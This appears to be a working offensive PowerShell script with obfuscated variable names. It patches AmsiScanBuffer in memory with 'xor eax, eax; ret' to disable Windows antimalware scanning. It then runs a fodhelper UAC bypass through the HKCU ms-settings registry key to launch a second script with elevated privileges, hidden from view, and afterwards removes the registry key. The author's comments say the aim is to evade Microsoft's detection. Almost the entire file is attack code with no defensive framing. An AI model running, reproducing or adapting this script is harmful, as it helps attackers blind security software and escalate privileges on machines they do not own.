#   need to change the add-type to reflective loading, this shit fucking triggers every single parser of microsoft, also need to remove comments to work properly
#   this shitty parser trigger comments ???
$3beba0bb61934429a13c7e299c4610be = @"
using System;
using System.Runtime.InteropServices;

public static class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type -TypeDefinition $3beba0bb61934429a13c7e299c4610be -PassThru | Out-Null

# gunction to get the function pointer of a function in a DLL
function Get-ProcAddress {
    param ([String]$Module, [String]$Function)

    $a467a06629fd4f8e9bba2bc292e7b0b2 = [Kernel32]::GetModuleHandle($Module)
    if ($a467a06629fd4f8e9bba2bc292e7b0b2 -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to get module handle for: $Module"
        return [IntPtr]::Zero
    }

    $0f5f575099964dc8a939812fd6298aea = [Kernel32]::GetProcAddress($a467a06629fd4f8e9bba2bc292e7b0b2, $Function)
    if ($0f5f575099964dc8a939812fd6298aea -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to get function address: $Function"
        return [IntPtr]::Zero
    }

    return $0f5f575099964dc8a939812fd6298aea
}

# get the address of AmsiScanBuffer
$ee53604107594f2f8b46fb97298ab5a9 = Get-ProcAddress -Module "amsi.dll" -Function "AmsiScanBuffer"
if ($ee53604107594f2f8b46fb97298ab5a9 -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to get AmsiScanBuffer address."
    exit
}

# get VirtualProtect function pointer
$75277193ae5240b082f3c6d225586ff8 = Get-ProcAddress -Module "kernel32.dll" -Function "VirtualProtect"
if ($75277193ae5240b082f3c6d225586ff8 -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to get VirtualProtect address."
    exit
}

# change memory protection to RWX (0x40 = PAGE_EXECUTE_READWRITE)
$4a9de04ab6164ad88791923a75380b53 = 0
$4725cc18365546659b0e76b2820edf6d = [Kernel32]::VirtualProtect($ee53604107594f2f8b46fb97298ab5a9, 6, 0x40, [ref]$4a9de04ab6164ad88791923a75380b53)
if (-not $4725cc18365546659b0e76b2820edf6d) {
    Write-Host "[!] VirtualProtect failed."
    exit
}

# patch AMSI: Write "xor eax, eax; ret"
$c43e822f834146669c71d1ec0bd0a8f9 = [Byte[]](0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($c43e822f834146669c71d1ec0bd0a8f9, 0, $ee53604107594f2f8b46fb97298ab5a9, $c43e822f834146669c71d1ec0bd0a8f9.Length)

Write-Host "[+] AMSI Patched Successfully"

# fodhelper via regedigt
$c10ea18da43749a6847617b29862e38d = "HKCU:\Software\Classes\ms-settings\shell\open\command"
$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"

New-Item $c10ea18da43749a6847617b29862e38d -Force | Out-Null
Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "DelegateExecute" -Value ""
Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "(Default)" -Value $459b05be8e2b43819fce3d3683c9bc53

Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden

Start-Sleep 3
Remove-Item $c10ea18da43749a6847617b29862e38d -Force -Recurse -ErrorAction SilentlyContinue

Write-Host "[+] Completed"
